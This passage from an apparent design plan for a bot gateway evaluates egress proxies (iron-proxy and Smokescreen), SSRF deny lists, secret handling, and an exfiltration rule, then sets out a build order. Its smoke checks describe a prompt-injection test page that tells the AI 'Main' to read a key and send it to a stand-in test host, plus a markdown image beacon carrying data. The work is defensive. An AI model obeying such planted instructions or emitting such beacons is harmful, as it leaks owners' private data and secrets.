servers, the outbound hop is **Stripe's Smokescreen**, used only as a plain outbound hop: a CONNECT forward proxy that
refuses non-public addresses by default, with no TLS termination and no CA, on a network of its own that only
`bots-gateway` can reach, and behind the gateway's own guard; a spike confirms it first. iron-proxy's default-deny
per-tool MCP allowlist idea is copied into the gateway. The reasons are under "Recommendation"; the rest of this section
is the evaluation they come from.

Question: should the gateway's outbound traffic (all three capabilities) go through
[iron-proxy](https://github.com/paradigmxyz/iron-proxy), an open-source egress firewall for untrusted workloads?
Read from its README, config example and source (`internal/dnsguard`, `internal/mcp`, `internal/transform`) at
v0.56.0. **Nothing here was run**; every behaviour below is from reading, and the spike at the end is what would
confirm it. A separate survey of other approaches (hosted sandboxes' egress firewalls, SSRF-safe forward proxies, MCP
gateway products, what comparable agent sandboxes do) was done alongside; its findings that change this section are
summarised under "Other approaches" below and its full text is with the research notes.

### What it is

A single Go binary with one YAML config (Apache-2.0). It runs a DNS server and an HTTP/HTTPS proxy, terminates TLS with
a CA we provide (MITM), runs each request through an ordered transform pipeline (`allowlist`, `secrets`,
`header_allowlist`, `annotate`, `body_capture`, `judge`, `oauth_token`, a `grpc` hook to an external service, and
others), and logs one structured JSON audit line per request (optionally exported over OTLP). It also has a first-class
MCP policy: for Streamable HTTP it parses JSON-RPC, applies a default-deny `tools/call` allowlist with optional
argument conditions, and filters `tools/list` responses, including per SSE event.

### How it maps to what we need

| Need | iron-proxy | Fit |
| --- | --- | --- |
| Default-deny egress | `allowlist` by domain glob or CIDR; unmatched gets 403 | Good for fixed destinations (model, TinyCloud MCP, search provider). For "fetch any public page" the allowlist has to be wide open, so the deny list does the work. |
| Built-in DNS | Resolves every name to the proxy so traffic is steered through it | Not used: the sandbox has no network, and the gateway would use the proxy's HTTP/CONNECT listener. The DNS server can be switched off (`dns.enabled: false`, in the config example; a trial ran with it off; v0.42.0 did not have the switch). |
| Upstream IP deny list | `upstream_deny_cidrs`, enforced in the dialer's `Control` hook after resolution (source: `internal/dnsguard`), so a name that resolves or rebinds to a denied address is refused before the connect; IPv4-mapped IPv6 is unmapped first | Good, and it is the piece we would otherwise write ourselves. **The default list is only cloud metadata and loopback.** Any proxy behind the gateway resolves the name again, so its list must carry the same ranges as the fetch guard (Web access): `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `100.64.0.0/10` (CGNAT, which includes the operators' private overlay network), `169.254.0.0/16`, `0.0.0.0/8`, `fc00::/7`, `fe80::/10`, `fec0::/10`, multicast, and the embedded-IPv4 forms (`::/96`, `64:ff9b::/96`, `64:ff9b:1::/48`, `2002::/16`, `2001::/32`). The gateway does not follow redirects, or re-checks every hop through the proxy. With an upstream proxy configured the check applies to the proxy's address, not the target. |
| Proxy tokens swapped for real secrets | `secrets` transform: the workload sends a token, the proxy replaces it from env, file, AWS, Vault or 1Password sources, `require: true` rejects requests without it | Fits static service keys (the model key, a search key). Does not fit per-owner, short-lived tokens: sources are static, and a changed value needs a config reload (`POST /v1/reload`) or a `grpc` transform we would write. The gateway keeps per-owner grants itself (section 2). Also: the `file` source does not trim, so a trailing newline becomes part of the header, and `require: true` on a host-only rule breaks tunnelled requests (#222). Only works in MITM mode. |
| Per-request audit | JSON per request with the transform trace, secrets swapped (names and locations, not values) and rejections. No headers or bodies, and no query string (checked in the v0.53.0 loopback trial, 2026-10-13) | Mixed. **Paths are logged**, and for web fetch the path is the owner's task content, so raw lines are not shipped as they are: log host only or hash the path (a filter in front of the log, or a patch), and add rotation, since there is none. It is per request, not per owner: it cannot know which bot made a call. |
| SSE / streamable HTTP | SSE is flushed per chunk, so MCP streamable HTTP over SSE works; WebSocket is HTTP/1 only | Good for MCP and model streaming. Non-SSE chunked responses (NDJSON, Connect, gRPC) are buffered until they end (an open issue, seen in a trial), and the 30 s response-header timeout needs raising for slow tool calls. |
| MCP pipeline | README for v0.56.0: per-server tool allowlist, `when` conditions on arguments, `tools/list` filtering, `mcp_gateway` routes with credential injection, audit of every JSON-RPC message. The v0.53.0 trial did not use any of it, so treat this as newer and unproven here | Not relied on in phases 1 and 2: the gateway's own rebuild, tool list and namespacing stay the gateway's job. Possibly useful later for owner-added servers (argument conditions). v1 limits: Streamable HTTP only, resources and prompts not enforced, a batch with one denied entry is rejected whole, static per-server YAML. |

### What it would replace in `bots-gateway`

- The outbound network code for web fetch and for MCP upstreams: the checked-address connect, the redirect re-check
  (the proxy does not follow redirects, so each hop is a new request through it) and the address deny list.
- Egress audit lines for those destinations.
- Holding static third-party keys (search provider) in the gateway: it would hold a proxy token instead. This exists
  only in MITM mode, which changes the trust (next section).

### What we still build

- Everything per bot or per owner: socket and token auth, the one-request slot, the chat body rebuild, token budgets
  and their reservation and settling, the `/v1/mcp` multiplexer and tool namespacing, grant storage, code exchange and
  refresh, call and byte budgets, owner events and counts.
- URL policy the proxy does not express: no user info, ports 80 and 443 only, scheme rules.
- Response policy: size cap, content-type limits, magic-number check, HTML to text, the untrusted-content wrapper.
- Tool pinning (name, description and schema hashes) and the owner-facing flows.
- The gateway's own SSRF guard is always built and always on, whichever hop is chosen (decision 7). A hop is an added
  outer ring, never a replacement for it.

### Two ways to place it

- **A. As the sandbox's path out** (HTTP proxy over the existing socket bridge, the proxy's CA in the sandbox rootfs).
  Rejected: it gives the sandbox raw HTTP to whatever the allowlist permits, contrary to the rule that the gateway does
  every outside call, and web fetch would run in the sandbox.
- **B. As the gateway's outer ring.** The gateway has no direct internet: it sits on a network whose only route out is
  the proxy. The proxy enforces the allowlist and the full deny list at dial time and writes the audit. The gateway
  trusts the proxy's CA only in MITM mode (next section). In MITM mode this is not a smaller-trust ring: the proxy
  joins the gateway's trust boundary. If iron-proxy is used at all, this is the placement.

### MITM or passthrough: the trust difference

- **With TLS interception (MITM), the proxy sees every token and every byte in plaintext**: owners' MCP bearer tokens,
  owner-server keys, TinyCloud data, fetched pages. Its CA can also impersonate any upstream to the gateway. So the
  proxy then holds the same trust as the gateway, not a smaller one, and the gateway is no longer the only component
  that holds both secrets and internet access.
- **With `tls.mode: sni-only` and CONNECT passthrough** there is no interception and no CA in the gateway, so the proxy
  never sees a token or a page. The host allowlist and the dial-time deny list still apply (this comes from a code read of
  an older release, `tunnel.go`, not a trial on v0.56.0; the spike confirms). Path, secret-swap and MCP transforms are lost, which costs
  little because the
  gateway already does MCP policy and holds the tokens, and static keys then stay in the gateway.
- **Leaning:** passthrough, unless the spike shows a need for interception. The spike compares both. If interception is
  kept anyway (for the secret swap or MCP transforms), the card must say so plainly: the proxy joins the gateway's trust
  boundary, it holds the CA key and sees every token and page, and any static key moved into it is exposed to the
  proxy's supply chain (one dominant maintainer, unsigned images).

### Deployment in the CVM (if iron-proxy is chosen; the same network rules apply to any dial-out hop)

- A new `bots-egress` container beside `bots-gateway` in `docker-compose.phala.yml`: unprivileged, read-only, no
  capabilities, no published port. **It does not join the existing `egress` network.** That network also holds
  `dstack-ingress`, which publishes 443 and mounts the CVM's `dstack.sock`, so any outbound component on it can reach
  ingress by its compose address. The proxy and the gateway get a dedicated network with neither ingress nor any other
  service on it, and the deny list covers the Docker subnets. The sandbox never reaches it.
- **The tunnel has no authentication** (`Proxy-Authorization` is not checked and SOCKS5 is no-auth). Anything that can
  reach its port can use it. So **`bots-gateway` is the only container that can reach `bots-egress`, now and in any
  later change**: it listens only on a network that holds the gateway and the proxy and nothing else, is never
  published, and no other service joins that network (a later service joining it, or a published port, breaks the
  rule). On a shared host a local user could otherwise use it. The spike checks that another container is refused.
- **Fail closed.** The gateway has no direct route, so if the proxy is down a fetch is refused, never sent direct.
- **Management and metrics listeners.** The management API (`/v1/reload`) is off by default; if enabled, bind it to
  loopback and keep its bearer in the proxy only. A code read of v0.53.0 (`internal/config`) shows the metrics listener
  defaulting to `:9090` on all interfaces; pin it to loopback (recheck on the pinned release).
- Built from a pinned release tag by our own Dockerfile (module checksums from `go.sum`) and referenced by digest, as
  the other images are. Release signing is thin: only v0.42.0 has a GPG-signed checksum file (it lacks the DNS switch);
  later releases, including v0.56.0, carry `checksums.txt` only, and the published images are unsigned. We pin by tag,
  digest and checksum, and review the diff of every upgrade; we do not pull `latest`.
- **In MITM mode only: the CA key can impersonate any site to anything that trusts it.** It is a deploy secret held by
  the proxy only (key files mode 0600), and only the gateway trusts the CA; it is never put in the sandbox, the
  supervisor or any other image. Real static keys (a search key) may move from the gateway's environment to the
  proxy's, scoped to exact HTTPS hosts (a secret can be swapped onto plain `http://`, an open issue). Per-owner tokens
  stay in the gateway. Config is one YAML file in the image; a change is a redeploy.
- The model leg stays direct from the gateway in phase 1. Putting it through the proxy adds a TLS-terminating hop for
  prompt traffic, and the gateway code shows no certificate pinning but we have not checked what the provider's
  verification relies on. Moving it is a separate decision after the spike.

### Maturity, licence, maintenance

- Apache-2.0. The repository was created 2026-04-01 and sits under the `paradigmxyz` organisation (873 stars; 13
  contributors, but one maintainer wrote about 80% of the commits); the Go module path and release badges still say
  `ironsh`, and the maintainers publish an enterprise product (a managed control plane, dynamic Vault engines, a
  Kubernetes operator) beside it. We would use the open standalone mode only.
- Pre-1.0: v0.56.0 (2026-11-04) after releases roughly every one to three weeks, mostly from one dominant maintainer;
  the last commit we saw was 2026-11-04. Expect config and behaviour changes between releases; we pin and review each
  bump, and do not auto-update. It sits on every byte of egress, so a bad release is a bad day.
- Open issues relevant to us (52 open in all): non-SSE streams buffered; request bodies over the buffer cap truncated
  when a transform reads the body (avoid `match_body`); secrets can be swapped over plain HTTP with no way to require
  TLS (scope secrets rules to exact HTTPS hosts); dependency advisories open on an earlier release (check the pinned
  one); unsigned images; denials return an empty 403 body.
- It publishes a private vulnerability-reporting contact.
- From the survey (not rechecked): two security advisories in the last three months (a bypass of the MCP tool allowlist
  by a non-JSON content type, fixed in 0.50.0, and a PostgreSQL row-level-security bypass, fixed in 0.53.0), about 157 of
  199 commits from one author, and commit volume down from 92 in April to 3 to 12 a month since July.
- Exit: the gateway talks to it through the standard proxy environment and a CA, and keeps its own guards, so replacing
  it with our own dial guard (or Squid or Envoy) loses the outer ring and nothing else.

### Other approaches (from the survey)

- **Do not open the sandbox's network; make every capability a gateway route.** This is the choice this plan already
  makes, and the one comparable sandboxes converge on (Anthropic's sandbox runtime also removes the network namespace and
  gives the sandbox proxies on Unix sockets; hosted sandbox products put the firewall and the credentials outside the
  sandbox and key policy on sandbox identity). Our gateway already has that identity: the socket path is the bot.
- **Smokescreen** (Stripe's forward proxy) as a dial-out hop behind the gateway: resolves names and refuses non-public
  addresses by default, per-client ACLs, rate and concurrency limits, CONNECT only, no TLS interception and no secret
  handling. That is a smaller job than iron-proxy's, with no CA to guard, and it matches the one thing phase 3 needs:
  SSRF-safe dialing of arbitrary owner hosts. Not run or verified by us.
- **Fetch through the search vendor** (Tavily Extract, Exa contents): the CVM dials only the vendor's fixed host, so
  SSRF and abuse from our addresses are closed by construction. It costs a per-page fee, the vendor sees the URLs, and it
  does nothing for the exfil rule. Not what was built: the owner chose that our own gateway fetches pages, so the vendor
  sees search queries only.
- **Hosted sandbox providers and MCP gateway products** move the whole sandbox off our CVM or aim at local containers
  and corporate sign-in; neither fits a sandbox that must stay inside the attested CVM.
- Not surveyed: Fly Machines and Envoy's dynamic forward proxy (alternatives to Smokescreen).

### Smokescreen compared (brief)

| | iron-proxy | Smokescreen |
| --- | --- | --- |
| What it is | Egress firewall: DNS plus HTTP(S) listeners or a tunnel, TLS interception, a transform pipeline, MCP policy | Forward proxy, CONNECT only, no TLS interception |
| Addresses | The default deny list is cloud metadata and loopback; private ranges are ours to add | Resolves the name and refuses non-public addresses by default |
| Secrets | Swaps proxy tokens for real keys (interception only) | None: the gateway keeps every secret |
| Per client | One policy per process | A per-client ACL keyed on an mTLS identity, with rate and concurrency limits |
| CA in the gateway | Yes, in interception mode | No |
| Fit for phase 3 | More than is needed, with the costs below | The one thing phase 3 needs: dialing arbitrary owner hosts without reaching our own addresses |

Smokescreen's details come from the survey and its README; we have not run it. Points for the spike: it is reachable by
anything on its network unless mTLS is configured, so the same rule applies (only `bots-gateway` reaches it); because
the proxy re-resolves the name, the gateway's own guard and the full deny list (including the embedded-IPv4 forms and
our Docker subnets) still run on both sides; and its maintenance status is unchecked.

### Recommendation, and the spike that decides it

**Recommendation.** As the decision at the top of this section. Reasons iron-proxy is not adopted now (from reading its
code and docs, not running it):
- One global policy per process and no per-bot identity (a client shows up only as a source address in its audit log),
  so per-owner policy would mean one proxy per bot with reloads; it has no rate limits or budgets, which ours already
  have per bot.
- It works through DNS steering plus HTTP and HTTPS listeners, or a tunnel listener. It has no Unix-socket client
  listener, enforcing it against code that ignores proxies needs a network namespace and nftables (`CAP_NET_ADMIN`),
  and interception needs its CA trusted in every sandbox. That reopens the network `--network=none` closed.
- With interception, placement B terminates TLS: the proxy sees every token and page and its CA can impersonate any
  upstream to the gateway, so it joins the gateway's trust boundary instead of being a smaller outer ring (the trust
  difference above).
- Its default deny list is metadata and loopback only, so RFC 1918, CGNAT, our Docker subnets and the embedded-IPv4
  forms are ours to maintain; the listener has no authentication; the audit logs paths and has no rotation.
- Its MCP policy covers tools only (resources and prompts are not enforced). An advisory (GHSA-vfgh-6jv3-4348, fixed in
  0.50.0) let a `tools/call` with a non-JSON `Content-Type` bypass the tool allowlist, the parser-differential kind of
  bug a policy engine in the middle is prone to. Open issues include #278 (secrets are swapped on plain HTTP) and the
  ones listed under Maturity.
- Pre-1.0, one dominant maintainer, unsigned images, checksums only on recent releases.

What is borrowed: its default-deny per-tool MCP allowlist, argument conditions and `tools/list` filtering are copied into
the gateway's rules (parse JSON-RPC whatever the `Content-Type`, reject batches). In every case the dial-out hop has a
network of its own without ingress, fails closed, is reached only by `bots-gateway`, and the gateway keeps its own guard
and all per-owner secrets. Revisit iron-proxy if bots ever need raw package or `curl` access; it would then sit behind
the gateway.

Spike before phase 3, Smokescreen first (1 to 2 days, throwaway CVM or locally; items 4 and 6 apply only if iron-proxy
is evaluated too, the rest apply to either):
1. The gateway's HTTP client reaches a test origin through the proxy's CONNECT listener, first in `sni-only`
   passthrough and then, if interception is wanted, with the proxy's CA, streaming an SSE response without buffering,
   and an MCP Streamable HTTP server through it. Decide MITM or passthrough here.
2. A rebinding name, a name resolving to each private range, each embedded or tunnelled form (IPv4-mapped, `::a.b.c.d`,
   NAT64 `64:ff9b::/96` and `64:ff9b:1::/48`, 6to4 `2002::/16`, Teredo `2001::/32`, site-local `fec0::/10`) and a
   decimal-form literal are each refused at dial time. Through a CONNECT hop the proxy resolves the name again, so the
   gateway's connect-to-the-checked-address does not extend through it: both the proxy and the gateway carry the full
   deny list, and the test runs against each.
3. A redirect to a denied address ends the fetch.
4. The audit line for a request carries no secret, body or token, and shows the swap for a static key.
5. Added latency per call, and memory over a 24-hour run.
6. Whether per-owner tokens can be handled by `file` plus reload or by a `grpc` transform without per-grant restarts; if
   not, they stay in the gateway as designed.
7. With the proxy stopped, a fetch is refused and nothing goes direct; from any container but the gateway (one on the
   same compose project, one on the host network) the tunnel is unreachable.
8. The log carries no fetched path or query in the form we ship, and the 30 s header timeout is raised and exercised.
9. Smokescreen: a metadata, private, CGNAT, Docker-subnet and tunnelled-IPv4 target is refused by default or with the
   configured list; the gateway authenticates to it (mTLS) and a second container without the client certificate is
   refused; its ACL names only the gateway.
10. Whether Bun's `fetch` can connect to a checked address with the original host in SNI (the gateway's own guard needs
    it); if not, the guard uses a small resolver-pinning dialer.

## Build order

0. **Precondition: decision 2.** No phase builds the TinyCloud grant path before the hosted MCP gives Main its own
   service identity, credential, tenant namespace and grant ceiling (section 2). None of that exists today.
1. **TinyCloud MCP.** Builds the shared parts the others reuse: the `/v1/mcp` route and JSON-RPC rebuild, the grant
   hand-off through the backend, the budget ledger, the count-only audit, the settings surface and the owner events.
2. **Web.** Adds the vendor adapter (Tavily Search) and the key-less page reader, the web tools, the URL checks and the exfil rule with
   its conversation mark. They ship together: this phase is what completes private data, untrusted content and a way
   out. The reply-rendering rule ships no later than this phase. Waits on the provider decision (key).
3. **Owner-added servers.** Adds the server registry, discovery, the credential flows with their bindings, tool pinning,
   the settings list, the dial guard (its own module with its own tests) and the Smokescreen hop. The egress spike runs
   before it starts.

The gateway's own guard is always built, whatever the spike decides. Each phase ships behind the existing test-account
flag and does not change the others.

## Decisions for the owner of each system (named, not designed here)

1. **OpenKey** (its owner decides). **Required for any cross-app read, on either route.** The screen that approves the
   extra authority a cross-app grant needs shows the cross-app warning with a "Reject this permission" control. The
   doc's reading is that this is the escalation prompt in OpenKey's popup or embedded approval (the screens the #538
   draft covers); OpenKey confirms which flow. The `/delegate` link flows show neither today (the #538 security review
   confirmed that ticket and link flows skip both the warning and the share rule), so they are not an acceptable
   screen for it. Also open: how TinyChat's session obtains the extra authority before it can delegate, how a bot
   requester appears, and the 1-hour one-off as the default with the 7-day choice behind a warning. Until it exists
   Main offers only TinyChat's own prefix, and the owner copy claims nothing about it.
2. **Step 1 route: how the gateway reaches the owner's TinyCloud data.** **A build precondition, not an option**: both
   routes need hosted-MCP work before Main can use either, so **phase 1 cannot start until the hosted MCP gives Main
   its own account space and address, with an audience and callback that OpenKey also accepts**. That is the OpenKey
   and hosted-MCP owners' call, not this plan's. Recommended: **B**.

   | | **A. OpenKey OAuth token in the gateway** | **B. The native-grant pattern the backend uses for transcripts** |
   | --- | --- | --- |
   | What the gateway holds | An access token and a refresh token | A service credential; no owner token |
   | Owner identity | The token's subject, checked after the code exchange | The owner DID the backend derives from the session and the supervisor registers for the bot (fixed per registration, and it must hash to the bot id); the gateway sends it; the grant itself names the owner |
   | Tenant separation (B1) | **Blocked.** Tenants are keyed by the OpenKey subject alone, so Main would share delegations with the owner's other MCP clients | Avoids it: a native tenant is keyed by owner DID with its own state, apart from the OAuth tenants. It is still one tenant per owner shared with the transcript grant, and one service credential, so Main needs its own (below) |
   | Windows (1 hour, 7 days) | Token-only: delegations are 30 days and have no revoke (TC-1156) | Real: the owner signs the expiry, and the node refuses it afterwards. A later grant that ends earlier is refused today |
   | Revoke | Tokens revoke at OpenKey; the delegation stays to its expiry | No revoke route; the signed expiry is the only early end; Disconnect stops Main's use |
   | Approval | OpenKey's `/delegate` link flows: no extra warning or per-permission reject today | Cross-app: OpenKey's approval screen for the extra authority, which must show the cross-app warning and "Reject this permission". TinyChat's own prefix: the signing step in the browser, as Main's history grant does |
   | Needs from OpenKey | A new OAuth client, audience and callback for a restricted address; the bot-requester warning and a "Reject this permission" control (decision 1) | The cross-app warning with "Reject this permission" on the escalation screen, and how TinyChat's session obtains the extra authority (decision 1); nothing for TinyChat's own prefix |
   | Needs from the hosted MCP | A restricted address with its own tenant state (or tenants keyed by subject and client), and a requested-expiry rule | Its own service DID, credential and tenant namespace for bots; a grant ceiling the owner picks (spaces, prefixes, databases, read only) with the read tools in section 3; a replace rule for a shorter grant after a longer one |
   | Needs from TinyChat | Code exchange, `state` and subject binding, encrypted token storage in the gateway | A backend grant route like the transcript one, the owner DID in bot registration, a signing sheet, the owner copy |

   Recommendation: B. It avoids the shared-tenant problem and makes the windows real. Its OpenKey need (the cross-app
   warning screen) is one A has too, so B adds none. Its cost is the same kind of hosted-MCP work A needs (a new
   identity and a wider ceiling), plus a fact to confirm: the native-path facts come from the js-sdk source at an older
   commit (`ae3b37c4`, 2026-10-29), not the deployed MCP. If that confirmation fails, A is the fallback.
3. **What "one task" means, and whether "7 days" renews.** This plan ends the grant's use when Main's turn settles. If
   a follow-up message should reuse it, say so before build. This plan's "For 7 days" does not renew, which is stricter
   than the earlier "7 days, renewing, behind a warning" rule; say which one ships.
4. **Search provider.** Recommended default: Tavily, which TinyChat already pays for, so there is no new provider.
   Checked in the code: the backend reads `TAVILY_API_KEY` from its environment and calls `POST
   https://api.tavily.com/search` (`backend/src/mcp-meetings/web-search.ts`). Not confirmed from code: the plan and
   contract behind that key (no DPA found in the compliance notes), (Extract is no longer used). **The key is a credential decision:** the bots service holding the backend's
   `TAVILY_API_KEY` is a second holder of the same secret in another deployment. Options: a separate key under the same
   account (recommended: separate budget and rotation), or share the backend's key. The owner decides; nothing is added
   until then. Alternatives: Brave Search API, Exa, Kagi, self-hosted SearXNG.
5. **The exfil rule for phase 2 (pick one).** It applies to any conversation whose context holds owner data (not just
   the task that read it) and to web fetch, web search and every owner-added server's tool arguments: (a) strict,
   recommended: for the rest of that conversation, no web search, no page fetch and no calls to owner-added servers
   (web search is off too, because a query is the same channel as a fetch); (b) narrowed: search with a capped query,
   fetch only of search-returned or owner-typed URLs, owner-added server calls refused; or (c) the owner confirms each
   new domain and each owner-added server. Outbound writes need the owner's approval under all three. Without one of
   these, phase 2 is an exfiltration path whatever the egress layer does. See Web access. Note, not the recommendation:
   the builder leans (b); (b) narrows the leak path but does not close it. The recommendation to start with is (a).
6. **Web access has no expiry** (it carries no owner authority). With the exfil rule above in place, "until I turn it
   off" is acceptable; say so if it should expire like the data grants.
7. **Egress layer.** Recommended: the gateway's own guard alone for phases 1 and 2 (no outbound hop is needed), and
   Smokescreen for owner-added servers (phase 3) as a plain outbound hop only: no TLS termination, no CA, on its own
   network, reachable only from `bots-gateway`. iron-proxy is not adopted now. Smokescreen has not been run by us, so
   the spike confirms the choice before phase 3 ships rather than choosing between hops. Whichever, the gateway keeps
   its own checks and the per-owner secrets.
8. **Reply rendering** (owner: the TinyChat frontend ...): every surface that draws model text filters image addresses and
   budgets them per reply (see Web access, rule 1): an address that looks like it carries data asks first with its full
   address, images beyond the first 2 from outside the allowlist wait behind one prompt, a non-web address never loads, the
   rest load as before; links send no referrer. The conversation mark does not gate images. Residual accepted: about 1.3
   kbit per silent image, 2 per reply.

## Smoke check for a later build

On a flagged test account:
- **TinyCloud:** approve "Just for this task" on one app, ask Main to list that app's keys (they come back); ask it to
  read another app (refused by the node); once the window is over, a call is `grant_ended`; Disconnect during a 7-day
  grant and the next call fails at the gateway; a write tool is `tool_not_permitted`.
- **Isolation and binding:** with the backend's transcript grant already in place for the same owner, Main's grant
  neither replaces nor shares it, and Main cannot read the connectors data through it; the gateway's service credential
  is refused for the backend's grants. A delegation signed for another delegate or by another user is refused by the
  backend (`wrong_delegatee`, `wrong_delegator`), and the node refuses a read outside the signed permissions. `GET` and
  `DELETE` on `/v1/mcp` return 405 and no reply carries `Mcp-Session-Id`.
- **Owner binding and cross-app:** a registration whose owner DID does not hash to the bot id is refused; a second
  registration for the same bot with a different DID is refused and the first stays; an owner or identity header sent
  from the sandbox is ignored; two owners' bots each read only their own grants. A grant for another app's data is
  offered only after OpenKey's approval screen showed the cross-app warning, and "Reject this permission" removes it;
  without that screen the picker lists only TinyChat's own prefix.
- **Web:** a search returns results; a fetch of a public URL returns text; `http://127.0.0.1`,
  `http://169.254.169.254`, a bare IP and a URL with user info are each refused before any call and counted as
  `blocked_url`; a 2 MiB page is cut to 40,000 characters; the 21st fetch in a task is `budget`. With a page that tells
  Main to read a key and fetch `https://<test host>/?d=<value>`, the chosen exfil rule holds: the test host receives no
  request carrying the value.
- **Owner-added server** (a local test server): the tool list shows; an unselected tool is refused; changing a tool's
  description withholds it; Remove ends the next call.
- **Owner-added server, more:** a server whose discovery names an authorization server on another site makes the add
  screen show that host and require confirmation, the authorization request carries `resource` set to the server's exact
  URL, and the token is refused on any other server or path. Paste a bearer key and then grep the backend and
  supervisor logs for it: it must not appear.
- **Conversation taint:** after a TinyCloud read, finish the task and start another with no grant-bearing call; the
  chosen exfil rule still applies to fetch, search and owner-added server calls until the conversation is reset.
- **Replies:** while marked and not, a reply containing `![x](https://<test host>/?d=1)` loads nothing from the test
  host in a real browser on every surface that shows it, and a link shows its host and opens only on a tap.
- **Everywhere:** the sandbox's environment, filesystem and a captured request contain no token or key. Report a mock run
  as a mock.
